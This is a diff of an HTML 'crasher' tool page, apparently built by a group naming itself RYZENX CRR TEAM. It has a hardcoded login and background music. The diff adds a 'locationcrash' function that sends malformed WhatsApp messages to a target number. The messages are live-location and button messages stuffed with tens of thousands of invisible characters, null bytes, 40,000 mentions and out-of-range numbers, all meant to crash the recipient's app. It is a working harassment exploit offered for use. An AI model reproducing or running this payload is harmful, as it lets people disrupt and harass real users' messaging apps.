@@ -39,7 +39,6 @@
       font-size: 16px;
       display: block;
       text-decoration: none;
-      text-align: center;
     }
     input {
       padding: 10px;
@@ -60,30 +59,10 @@
       background: white;
       color: black;
     }
-    #notif-floating {
-      position: fixed;
-      top: -100px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: rgba(0, 0, 0, 0.8);
-      padding: 10px 20px;
-      border-radius: 15px;
-      color: white;
-      font-weight: bold;
-      box-shadow: 0 0 10px red;
-      animation: floatNotif 6s infinite;
-      z-index: 9999;
-    }
-    @keyframes floatNotif {
-      0% { top: -100px; opacity: 0; }
-      25% { top: 50px; opacity: 1; }
-      75% { top: 50px; opacity: 1; }
-      100% { top: -100px; opacity: 0; }
-    }
   </style>
 </head>
 <body>
-  <div id="notif-floating">DILARANG MENJUAL/SHARE GRATIS<br>LU BUKAN SIAPA-SIAPA</div>
+  <h1>ASSORTED CRASHER V3</h1>
   <audio id="bg-music" src="https://files.catbox.moe/8ydmap.mp3" autoplay loop></audio>
   <div class="card" id="login-card">
     <h2>Login</h2>
@@ -142,7 +121,7 @@
       <button onclick="backToMenu()">Back</button>
     </div>
   </div>
-  <p style="margin-top:30px; color:white; text-shadow: 1px 1px black;">© RYZENX CRR TEAM</p>
+  <p style="margin-top:30px;">© RYZENX CRR TEAM</p>
   <script>
     let currentCrash = '';
     const audio = document.getElementById('bg-music');
@@ -158,27 +137,21 @@
 }
 
 function login() {
-  const email = document.getElementById('email').value.toLowerCase();
-  const pw = document.getElementById('password').value.toLowerCase();
+  const email = document.getElementById('email').value;
+  const pw = document.getElementById('password').value;
   const notif = document.getElementById('notif-login');
-  if (
-    (email === 'ryzenxcrr' && pw === 'ryzenx host') ||
-    (email === 'jea' && pw === 'jangan dijual atau dikasih free')
-  ) {
+  if (email !== 'ryzenxcrr' && pw !== 'ryzenx host') {
+    notif.innerText = 'apalah\nnyolong ya\npw aja salah';
+  } else if (email !== 'ryzenxcrr') {
+    notif.innerText = 'email aja salah';
+  } else if (pw !== 'ryzenx host') {
+    notif.innerText = 'pw aja salah';
+  } else {
     notif.innerText = 'Berhasil login...';
     setTimeout(() => {
       document.getElementById('login-card').style.display = 'none';
       document.getElementById('menu-card').style.display = 'block';
     }, 3000);
-  } else if (email !== 'ryzenxcrr' && email !== 'jea') {
-    notif.innerText = 'email aja salah';
-  } else if (
-    (email === 'ryzenxcrr' && pw !== 'ryzenx host') ||
-    (email === 'jea' && pw !== 'jangan dijual atau dikasih free')
-  ) {
-    notif.innerText = 'pw aja salah';
-  } else {
-    notif.innerText = 'apalah\nnyolong ya\npw aja salah';
   }
 }
 
@@ -225,6 +198,59 @@ function backToMenu() {
 function openTQTO() {
   document.getElementById('menu-card').style.display = 'none';
   document.getElementById('tqto-panel').style.display = 'block';
+}
+
+// 🔁 ASYNC FUNCTION SECTION
+async function locationcrash(target) {
+  const liveLocationCrash = {
+    liveLocationMessage: {
+      degreesLatitude: 77777777,
+      degreesLongitude: -9999999,
+      accuracyInMeters: 99999999,
+      name: "\u200e".repeat(60000),
+      speedInMps: -999,
+      magneticHeading: 999,
+      caption: "ꦾ".repeat(60000),
+      sequenceNumber: Number.MAX_SAFE_INTEGER,
+      timeOffset: 999999999999,
+      contextInfo: {
+        stanzaId: "\u0000".repeat(9999),
+        mentionedJid: Array.from({ length: 40000 }, (_, i) => `${500000 + i}@s.whatsapp.net`),
+        businessMessageForwardInfo: {
+          businessOwnerJid: "5521992999999@s.whatsapp.net"
+        },
+        externalAdReply: {
+          title: "\u0000".repeat(90999)
+        }
+      }
+    }
+  };
+  await stx.relayMessage(target, {
+    viewOnceMessage: {
+      message: {
+        buttonsMessage: {
+          text: "S",
+          contentText: "S",
+          footerText: "",
+          buttons: [{
+            buttonId: "\U200E".repeat(60000),
+            buttonText: {
+              displayText: "S"
+            },
+            type: 1
+          }],
+          headerType: 1
+        }
+      }
+    }
+  }, {
+    messageId: `crash-${Date.now()}-${Math.floor(Math.random()*676969)}`,
+    participant: target
+  });
+  await stx.relayMessage(target, liveLocationCrash, {
+    messageId: "live-" + Date.now(),
+    participant: target
+  });
 }
 
   </script>
